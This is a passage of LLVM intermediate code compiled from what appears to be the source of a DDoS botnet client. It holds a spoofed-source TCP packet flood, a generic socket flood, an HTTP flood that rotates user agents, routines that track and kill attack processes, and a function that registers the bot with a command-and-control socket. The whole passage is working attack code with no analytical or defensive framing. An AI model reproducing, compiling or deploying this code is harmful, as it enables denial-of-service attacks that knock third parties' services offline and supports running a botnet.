  %125 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %124, i32 0, i32 4
  %126 = load i16, i16* %125, align 4
  %127 = and i16 %126, -1025
  %128 = or i16 %127, 1024
  store i16 %128, i16* %125, align 4
  %129 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %130 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %129, i32 0, i32 0
  %131 = bitcast %union.anon* %130 to %struct.anon.0*
  %132 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %131, i32 0, i32 4
  %133 = load i16, i16* %132, align 4
  %134 = and i16 %133, -257
  %135 = or i16 %134, 256
  store i16 %135, i16* %132, align 4
  %136 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %137 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %136, i32 0, i32 0
  %138 = bitcast %union.anon* %137 to %struct.anon.0*
  %139 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %138, i32 0, i32 4
  %140 = load i16, i16* %139, align 4
  %141 = and i16 %140, -4097
  %142 = or i16 %141, 4096
  store i16 %142, i16* %139, align 4
  %143 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %144 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %143, i32 0, i32 0
  %145 = bitcast %union.anon* %144 to %struct.anon.0*
  %146 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %145, i32 0, i32 4
  %147 = load i16, i16* %146, align 4
  %148 = and i16 %147, -2049
  %149 = or i16 %148, 2048
  store i16 %149, i16* %146, align 4
  br label %226

150:                                              ; preds = %67
  %151 = load i8*, i8** %10, align 8
  %152 = call i8* @strtok(i8* %151, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #11
  store i8* %152, i8** %22, align 8
  br label %153

153:                                              ; preds = %223, %150
  %154 = load i8*, i8** %22, align 8
  %155 = icmp ne i8* %154, null
  br i1 %155, label %156, label %225

156:                                              ; preds = %153
  %157 = load i8*, i8** %22, align 8
  %158 = call i32 @strcmp(i8* %157, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.44, i64 0, i64 0)) #12
  %159 = icmp ne i32 %158, 0
  br i1 %159, label %168, label %160

160:                                              ; preds = %156
  %161 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %162 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %161, i32 0, i32 0
  %163 = bitcast %union.anon* %162 to %struct.anon.0*
  %164 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %163, i32 0, i32 4
  %165 = load i16, i16* %164, align 4
  %166 = and i16 %165, -513
  %167 = or i16 %166, 512
  store i16 %167, i16* %164, align 4
  br label %223

168:                                              ; preds = %156
  %169 = load i8*, i8** %22, align 8
  %170 = call i32 @strcmp(i8* %169, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.45, i64 0, i64 0)) #12
  %171 = icmp ne i32 %170, 0
  br i1 %171, label %180, label %172

172:                                              ; preds = %168
  %173 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %174 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %173, i32 0, i32 0
  %175 = bitcast %union.anon* %174 to %struct.anon.0*
  %176 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %175, i32 0, i32 4
  %177 = load i16, i16* %176, align 4
  %178 = and i16 %177, -1025
  %179 = or i16 %178, 1024
  store i16 %179, i16* %176, align 4
  br label %222

180:                                              ; preds = %168
  %181 = load i8*, i8** %22, align 8
  %182 = call i32 @strcmp(i8* %181, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.46, i64 0, i64 0)) #12
  %183 = icmp ne i32 %182, 0
  br i1 %183, label %192, label %184

184:                                              ; preds = %180
  %185 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %186 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %185, i32 0, i32 0
  %187 = bitcast %union.anon* %186 to %struct.anon.0*
  %188 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %187, i32 0, i32 4
  %189 = load i16, i16* %188, align 4
  %190 = and i16 %189, -257
  %191 = or i16 %190, 256
  store i16 %191, i16* %188, align 4
  br label %221

192:                                              ; preds = %180
  %193 = load i8*, i8** %22, align 8
  %194 = call i32 @strcmp(i8* %193, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.47, i64 0, i64 0)) #12
  %195 = icmp ne i32 %194, 0
  br i1 %195, label %204, label %196

196:                                              ; preds = %192
  %197 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %198 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %197, i32 0, i32 0
  %199 = bitcast %union.anon* %198 to %struct.anon.0*
  %200 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %199, i32 0, i32 4
  %201 = load i16, i16* %200, align 4
  %202 = and i16 %201, -4097
  %203 = or i16 %202, 4096
  store i16 %203, i16* %200, align 4
  br label %220

204:                                              ; preds = %192
  %205 = load i8*, i8** %22, align 8
  %206 = call i32 @strcmp(i8* %205, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.48, i64 0, i64 0)) #12
  %207 = icmp ne i32 %206, 0
  br i1 %207, label %216, label %208

208:                                              ; preds = %204
  %209 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %210 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %209, i32 0, i32 0
  %211 = bitcast %union.anon* %210 to %struct.anon.0*
  %212 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %211, i32 0, i32 4
  %213 = load i16, i16* %212, align 4
  %214 = and i16 %213, -2049
  %215 = or i16 %214, 2048
  store i16 %215, i16* %212, align 4
  br label %219

216:                                              ; preds = %204
  %217 = load i8*, i8** %22, align 8
  %218 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.49, i64 0, i64 0), i8* %217)
  br label %219

219:                                              ; preds = %216, %208
  br label %220

220:                                              ; preds = %219, %196
  br label %221

221:                                              ; preds = %220, %184
  br label %222

222:                                              ; preds = %221, %172
  br label %223

223:                                              ; preds = %222, %160
  %224 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #11
  store i8* %224, i8** %22, align 8
  br label %153, !llvm.loop !15

225:                                              ; preds = %153
  br label %226

226:                                              ; preds = %225, %114
  %227 = call i32 @rand_cmwc()
  %228 = trunc i32 %227 to i16
  %229 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %230 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %229, i32 0, i32 0
  %231 = bitcast %union.anon* %230 to %struct.anon.0*
  %232 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %231, i32 0, i32 5
  store i16 %228, i16* %232, align 2
  %233 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %234 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %233, i32 0, i32 0
  %235 = bitcast %union.anon* %234 to %struct.anon.0*
  %236 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %235, i32 0, i32 6
  store i16 0, i16* %236, align 4
  %237 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %238 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %237, i32 0, i32 0
  %239 = bitcast %union.anon* %238 to %struct.anon.0*
  %240 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %239, i32 0, i32 7
  store i16 0, i16* %240, align 2
  %241 = load i32, i32* %7, align 4
  %242 = icmp eq i32 %241, 0
  br i1 %242, label %243, label %245

243:                                              ; preds = %226
  %244 = call i32 @rand_cmwc()
  br label %250

245:                                              ; preds = %226
  %246 = load i32, i32* %7, align 4
  %247 = trunc i32 %246 to i16
  %248 = call zeroext i16 @htons(i16 zeroext %247) #10
  %249 = zext i16 %248 to i32
  br label %250

250:                                              ; preds = %245, %243
  %251 = phi i32 [ %244, %243 ], [ %249, %245 ]
  %252 = trunc i32 %251 to i16
  %253 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %254 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %253, i32 0, i32 0
  %255 = bitcast %union.anon* %254 to %struct.anon.0*
  %256 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %255, i32 0, i32 1
  store i16 %252, i16* %256, align 2
  %257 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %258 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %259 = call zeroext i16 @tcpcsum(%struct.iphdr* %257, %struct.tcphdr* %258)
  %260 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %261 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %260, i32 0, i32 0
  %262 = bitcast %union.anon* %261 to %struct.anon.0*
  %263 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %262, i32 0, i32 6
  store i16 %259, i16* %263, align 4
  %264 = bitcast i8* %72 to i16*
  %265 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %266 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %265, i32 0, i32 2
  %267 = load i16, i16* %266, align 2
  %268 = zext i16 %267 to i32
  %269 = call zeroext i16 @csum(i16* %264, i32 %268)
  %270 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i32 0, i32 7
  store i16 %269, i16* %271, align 2
  %272 = call i64 @time(i64* null) #11
  %273 = load i32, i32* %8, align 4
  %274 = sext i32 %273 to i64
  %275 = add nsw i64 %272, %274
  %276 = trunc i64 %275 to i32
  store i32 %276, i32* %23, align 4
  store i32 0, i32* %24, align 4
  br label %277

277:                                              ; preds = %331, %330, %250
  br label %278

278:                                              ; preds = %277
  %279 = load i32, i32* %15, align 4
  %280 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  %281 = call i64 @sendto(i32 %279, i8* %72, i64 %70, i32 0, %struct.sockaddr* %280, i32 16)
  %282 = load i32, i32* %17, align 4
  %283 = call i32 @getRandomIP(i32 %282)
  %284 = call i32 @htonl(i32 %283) #10
  %285 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %286 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %285, i32 0, i32 8
  store i32 %284, i32* %286, align 4
  %287 = call i32 @rand_cmwc()
  %288 = trunc i32 %287 to i16
  %289 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %290 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %289, i32 0, i32 3
  store i16 %288, i16* %290, align 4
  %291 = call i32 @rand_cmwc()
  %292 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %293 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %292, i32 0, i32 0
  %294 = bitcast %union.anon* %293 to %struct.anon.0*
  %295 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %294, i32 0, i32 2
  store i32 %291, i32* %295, align 4
  %296 = call i32 @rand_cmwc()
  %297 = trunc i32 %296 to i16
  %298 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %299 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %298, i32 0, i32 0
  %300 = bitcast %union.anon* %299 to %struct.anon.0*
  %301 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %300, i32 0, i32 0
  store i16 %297, i16* %301, align 4
  %302 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %303 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %302, i32 0, i32 0
  %304 = bitcast %union.anon* %303 to %struct.anon.0*
  %305 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %304, i32 0, i32 6
  store i16 0, i16* %305, align 4
  %306 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %307 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %308 = call zeroext i16 @tcpcsum(%struct.iphdr* %306, %struct.tcphdr* %307)
  %309 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %310 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %309, i32 0, i32 0
  %311 = bitcast %union.anon* %310 to %struct.anon.0*
  %312 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %311, i32 0, i32 6
  store i16 %308, i16* %312, align 4
  %313 = bitcast i8* %72 to i16*
  %314 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %315 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %314, i32 0, i32 2
  %316 = load i16, i16* %315, align 2
  %317 = zext i16 %316 to i32
  %318 = call zeroext i16 @csum(i16* %313, i32 %317)
  %319 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %320 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %319, i32 0, i32 7
  store i16 %318, i16* %320, align 2
  %321 = load i32, i32* %24, align 4
  %322 = load i32, i32* %13, align 4
  %323 = icmp eq i32 %321, %322
  br i1 %323, label %324, label %331

324:                                              ; preds = %278
  %325 = call i64 @time(i64* null) #11
  %326 = load i32, i32* %23, align 4
  %327 = sext i32 %326 to i64
  %328 = icmp sgt i64 %325, %327
  br i1 %328, label %329, label %330

329:                                              ; preds = %324
  br label %334

330:                                              ; preds = %324
  store i32 0, i32* %24, align 4
  br label %277

331:                                              ; preds = %278
  %332 = load i32, i32* %24, align 4
  %333 = add i32 %332, 1
  store i32 %333, i32* %24, align 4
  br label %277

334:                                              ; preds = %329
  %335 = load i8*, i8** %18, align 8
  call void @llvm.stackrestore(i8* %335)
  br label %336

336:                                              ; preds = %334, %56, %50, %43
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8*, i8*) #4

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #2

declare i32 @printf(i8*, ...) #6

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @stdflood(i8* %0, i32 %1, i32 %2, i32 %3) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca %struct.hostent*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %15 = call i32 @socket(i32 2, i32 2, i32 0) #11
  store i32 %15, i32* %9, align 4
  %16 = call i64 @time(i64* null) #11
  store i64 %16, i64* %10, align 8
  %17 = load i8*, i8** %5, align 8
  %18 = call %struct.hostent* @gethostbyname(i8* %17)
  store %struct.hostent* %18, %struct.hostent** %12, align 8
  %19 = bitcast %struct.sockaddr_in* %11 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %19, i8 0, i64 16, i1 false)
  %20 = load %struct.hostent*, %struct.hostent** %12, align 8
  %21 = getelementptr inbounds %struct.hostent, %struct.hostent* %20, i32 0, i32 4
  %22 = load i8**, i8*** %21, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %26 = bitcast %struct.in_addr* %25 to i8*
  %27 = load %struct.hostent*, %struct.hostent** %12, align 8
  %28 = getelementptr inbounds %struct.hostent, %struct.hostent* %27, i32 0, i32 3
  %29 = load i32, i32* %28, align 4
  %30 = sext i32 %29 to i64
  call void @bcopy(i8* %24, i8* %26, i64 %30) #11
  %31 = load %struct.hostent*, %struct.hostent** %12, align 8
  %32 = getelementptr inbounds %struct.hostent, %struct.hostent* %31, i32 0, i32 2
  %33 = load i32, i32* %32, align 8
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 %34, i16* %35, align 4
  %36 = load i32, i32* %6, align 4
  %37 = trunc i32 %36 to i16
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  store i32 0, i32* %13, align 4
  br label %39

39:                                               ; preds = %4, %62
  %40 = load i32, i32* %13, align 4
  %41 = icmp uge i32 %40, 50
  br i1 %41, label %42, label %62

42:                                               ; preds = %39
  %43 = call i8* @makestring()
  store i8* %43, i8** %14, align 8
  %44 = load i32, i32* %9, align 4
  %45 = load i8*, i8** %14, align 8
  %46 = load i32, i32* %8, align 4
  %47 = sext i32 %46 to i64
  %48 = call i64 @send(i32 %44, i8* %45, i64 %47, i32 0)
  %49 = load i32, i32* %9, align 4
  %50 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %51 = call i32 @connect(i32 %49, %struct.sockaddr* %50, i32 16)
  %52 = call i64 @time(i64* null) #11
  %53 = load i64, i64* %10, align 8
  %54 = load i32, i32* %7, align 4
  %55 = sext i32 %54 to i64
  %56 = add nsw i64 %53, %55
  %57 = icmp sge i64 %52, %56
  br i1 %57, label %58, label %61

58:                                               ; preds = %42
  %59 = load i32, i32* %9, align 4
  %60 = call i32 @close(i32 %59)
  call void @_exit(i32 0) #13
  unreachable

61:                                               ; preds = %42
  store i32 0, i32* %13, align 4
  br label %62

62:                                               ; preds = %61, %39
  %63 = load i32, i32* %13, align 4
  %64 = add i32 %63, 1
  store i32 %64, i32* %13, align 4
  br label %39
}

declare %struct.hostent* @gethostbyname(i8*) #6

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #2

declare i64 @send(i32, i8*, i64, i32) #6

declare i32 @connect(i32, %struct.sockaddr*, i32) #6

declare i32 @close(i32) #6

; Function Attrs: noreturn
declare void @_exit(i32) #8

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @socket_connect(i8* %0, i16 zeroext %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i16, align 2
  %5 = alloca %struct.hostent*, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i16 %1, i16* %4, align 2
  store i32 1, i32* %7, align 4
  %9 = load i8*, i8** %3, align 8
  %10 = call %struct.hostent* @gethostbyname(i8* %9)
  store %struct.hostent* %10, %struct.hostent** %5, align 8
  %11 = icmp eq %struct.hostent* %10, null
  br i1 %11, label %12, label %13

12:                                               ; preds = %2
  call void @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.50, i64 0, i64 0)) #11
  call void @exit(i32 1) #14
  unreachable

13:                                               ; preds = %2
  %14 = load %struct.hostent*, %struct.hostent** %5, align 8
  %15 = getelementptr inbounds %struct.hostent, %struct.hostent* %14, i32 0, i32 4
  %16 = load i8**, i8*** %15, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 0
  %18 = load i8*, i8** %17, align 8
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %20 = bitcast %struct.in_addr* %19 to i8*
  %21 = load %struct.hostent*, %struct.hostent** %5, align 8
  %22 = getelementptr inbounds %struct.hostent, %struct.hostent* %21, i32 0, i32 3
  %23 = load i32, i32* %22, align 4
  %24 = sext i32 %23 to i64
  call void @bcopy(i8* %18, i8* %20, i64 %24) #11
  %25 = load i16, i16* %4, align 2
  %26 = call zeroext i16 @htons(i16 zeroext %25) #10
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %26, i16* %27, align 2
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = call i32 @socket(i32 2, i32 1, i32 6) #11
  store i32 %29, i32* %8, align 4
  %30 = load i32, i32* %8, align 4
  %31 = bitcast i32* %7 to i8*
  %32 = call i32 @setsockopt(i32 %30, i32 6, i32 1, i8* %31, i32 4) #11
  %33 = load i32, i32* %8, align 4
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %35, label %36

35:                                               ; preds = %13
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.51, i64 0, i64 0))
  call void @exit(i32 1) #14
  unreachable

36:                                               ; preds = %13
  %37 = load i32, i32* %8, align 4
  %38 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %39 = call i32 @connect(i32 %37, %struct.sockaddr* %38, i32 16)
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %36
  call void @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.52, i64 0, i64 0))
  call void @exit(i32 1) #14
  unreachable

42:                                               ; preds = %36
  %43 = load i32, i32* %8, align 4
  ret i32 %43
}

; Function Attrs: nounwind
declare void @herror(i8*) #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

declare void @perror(i8*) #6

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @httpflood(i8* %0, i8* %1, i16 zeroext %2, i8* %3, i32 %4, i32 %5) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i64 @time(i64* null) #11
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = add nsw i64 %19, %21
  %23 = trunc i64 %22 to i32
  store i32 %23, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  br label %24

24:                                               ; preds = %63, %6
  %25 = load i32, i32* %14, align 4
  %26 = load i32, i32* %12, align 4
  %27 = icmp slt i32 %25, %26
  br i1 %27, label %28, label %66

28:                                               ; preds = %24
  %29 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i64 0, i64 0
  %30 = load i8*, i8** %7, align 8
  %31 = load i8*, i8** %10, align 8
  %32 = load i8*, i8** %8, align 8
  %33 = call i32 @rand() #11
  %34 = srem i32 %33, 39
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [39 x i8*], [39 x i8*]* @UserAgents, i64 0, i64 %35
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 (i8*, i8*, ...) @sprintf(i8* %29, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.53, i64 0, i64 0), i8* %30, i8* %31, i8* %32, i8* %37) #11
  br label %39

39:                                               ; preds = %61, %28
  %40 = load i32, i32* %15, align 4
  %41 = sext i32 %40 to i64
  %42 = call i64 @time(i64* null) #11
  %43 = icmp sgt i64 %41, %42
  br i1 %43, label %44, label %62

44:                                               ; preds = %39
  %45 = load i8*, i8** %8, align 8
  %46 = load i16, i16* %9, align 2
  %47 = call i32 @socket_connect(i8* %45, i16 zeroext %46)
  store i32 %47, i32* %13, align 4
  %48 = load i32, i32* %13, align 4
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %50, label %61

50:                                               ; preds = %44
  %51 = load i32, i32* %13, align 4
  %52 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i64 0, i64 0
  %53 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i64 0, i64 0
  %54 = call i64 @strlen(i8* %53) #12
  %55 = call i64 @write(i32 %51, i8* %52, i64 %54)
  %56 = load i32, i32* %13, align 4
  %57 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i64 0, i64 0
  %58 = call i64 @read(i32 %56, i8* %57, i64 1)
  %59 = load i32, i32* %13, align 4
  %60 = call i32 @close(i32 %59)
  br label %61

61:                                               ; preds = %50, %44
  br label %39, !llvm.loop !16

62:                                               ; preds = %39
  call void @exit(i32 0) #14
  unreachable

63:                                               ; No predecessors!
  %64 = load i32, i32* %14, align 4
  %65 = add nsw i32 %64, 1
  store i32 %65, i32* %14, align 4
  br label %24, !llvm.loop !17

66:                                               ; preds = %24
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #2

declare i64 @write(i32, i8*, i64) #6

declare i64 @read(i32, i8*, i64) #6

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #11
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

8:                                                ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %47

10:                                               ; preds = %0
  %11 = load i64, i64* @numattackpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numattackpids, align 8
  %13 = load i64, i64* @numattackpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias align 16 i8* @malloc(i64 %15) #11
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

18:                                               ; preds = %34, %10
  %19 = load i32, i32* %4, align 4
  %20 = zext i32 %19 to i64
  %21 = load i64, i64* @numattackpids, align 8
  %22 = sub i64 %21, 1
  %23 = icmp ult i64 %20, %22
  br i1 %23, label %24, label %37

24:                                               ; preds = %18
  %25 = load i32*, i32** @attackpids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

34:                                               ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %18, !llvm.loop !18

37:                                               ; preds = %18
  %38 = load i32, i32* %2, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i64, i64* @numattackpids, align 8
  %41 = sub i64 %40, 1
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  %43 = load i32*, i32** @attackpids, align 8
  %44 = bitcast i32* %43 to i8*
  call void @free(i8* %44) #11
  %45 = load i32*, i32** %3, align 8
  store i32* %45, i32** @attackpids, align 8
  %46 = load i32, i32* %2, align 4
  store i32 %46, i32* %1, align 4
  br label %47

47:                                               ; preds = %37, %8
  %48 = load i32, i32* %1, align 4
  ret i32 %48
}

; Function Attrs: nounwind
declare i32 @fork() #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @stop_attack() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i64, align 8
  store i32 0, i32* %1, align 4
  store i64 0, i64* %2, align 8
  br label %3

3:                                                ; preds = %29, %0
  %4 = load i64, i64* %2, align 8
  %5 = load i64, i64* @numattackpids, align 8
  %6 = icmp ult i64 %4, %5
  br i1 %6, label %7, label %32

7:                                                ; preds = %3
  %8 = load i32*, i32** @attackpids, align 8
  %9 = load i64, i64* %2, align 8
  %10 = getelementptr inbounds i32, i32* %8, i64 %9
  %11 = load i32, i32* %10, align 4
  %12 = icmp ne i32 %11, 0
  br i1 %12, label %13, label %28

13:                                               ; preds = %7
  %14 = load i32*, i32** @attackpids, align 8
  %15 = load i64, i64* %2, align 8
  %16 = getelementptr inbounds i32, i32* %14, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = call i32 @getpid() #11
  %19 = icmp ne i32 %17, %18
  br i1 %19, label %20, label %28

20:                                               ; preds = %13
  %21 = load i32*, i32** @attackpids, align 8
  %22 = load i64, i64* %2, align 8
  %23 = getelementptr inbounds i32, i32* %21, i64 %22
  %24 = load i32, i32* %23, align 4
  %25 = call i32 @kill(i32 %24, i32 9) #11
  %26 = load i32, i32* %1, align 4
  %27 = add nsw i32 %26, 1
  store i32 %27, i32* %1, align 4
  br label %28

28:                                               ; preds = %20, %13, %7
  br label %29

29:                                               ; preds = %28
  %30 = load i64, i64* %2, align 8
  %31 = add i64 %30, 1
  store i64 %31, i64* %2, align 8
  br label %3, !llvm.loop !19

32:                                               ; preds = %3
  ret void
}

; Function Attrs: nounwind
declare i32 @getpid() #2

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @registerme(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [100 x i8], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [100 x i8], [100 x i8]* %3, i64 0, i64 0
  %5 = load i8*, i8** %2, align 8
  %6 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %4, i64 100, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.55, i64 0, i64 0), i8* %5) #11
  %7 = load i32, i32* @C2, align 4
  %8 = getelementptr inbounds [100 x i8], [100 x i8]* %3, i64 0, i64 0
  %9 = getelementptr inbounds [100 x i8], [100 x i8]* %3, i64 0, i64 0
  %10 = call i64 @strlen(i8* %9) #12
  %11 = call i64 @write(i32 %7, i8* %8, i64 %10)
  %12 = icmp ne i64 %11, 0
  br i1 %12, label %13, label %14

13:                                               ; preds = %1
  br label %15

14:                                               ; preds = %1
  br label %15

15:                                               ; preds = %14, %13
  ret void
}

; Function Attrs: nounwind
